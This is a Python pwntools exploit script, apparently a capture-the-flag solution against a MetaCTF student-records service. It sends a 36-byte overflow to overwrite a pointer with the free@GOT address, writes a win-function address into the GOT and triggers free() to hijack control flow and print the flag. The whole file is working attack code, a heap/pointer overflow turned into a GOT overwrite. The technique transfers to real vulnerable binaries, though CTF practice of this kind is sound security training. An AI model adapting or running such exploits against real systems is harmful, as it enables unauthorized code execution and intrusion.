from pwn import *

# Addresses
win_addr = 0x08049316
free_got = 0x0804c010

context.log_level = 'info'

# Connect to remote
p = remote('host5.metaproblems.com', 5035)

# Step 1: Create student 0
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'?', b'TestName')
p.sendlineafter(b'?', b'12')
p.sendlineafter(b'?', b'3.5')

# Step 2: Modify student 0, option 1 - overwrite grade_ptr with free@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'1')

payload = b'A' * 36 + p32(free_got)
p.sendlineafter(b': ', payload)

# Step 3: Modify student 0, option 2 - write win address to free@GOT
p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'?', b'0')
p.sendlineafter(b'?', b'2')
p.sendlineafter(b': ', str(win_addr).encode())

# Step 4: Trigger free() by removing a student
p.sendlineafter(b'> ', b'2')  # Remove student option
p.sendlineafter(b'?', b'0')   # Remove student 0

# Get the flag!
print("\n=== REMOTE FLAG ===")
flag_output = p.recvall(timeout=3).decode(errors='ignore')
print(flag_output)

# Extract just the flag
import re
match = re.search(r'MetaCTF\{[^}]+\}', flag_output)
if match:
    print(f"\nðŸš© FLAG: {match.group(0)}")

p.close()
